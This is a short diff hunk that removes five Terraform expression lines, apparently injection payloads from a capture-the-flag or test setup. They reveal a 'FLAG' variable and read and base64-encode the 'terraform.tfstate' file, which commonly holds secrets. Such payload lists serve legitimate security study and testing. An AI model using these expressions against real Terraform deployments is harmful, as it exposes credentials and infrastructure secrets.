@@ -1,5 +1,0 @@
-format(var.FLAG)
-file("terraform.tfstate")
-strrev(var.FLAG)
-base64encode(file("terraform.tfstate"))
-base64encode(local_file.flag.filename)
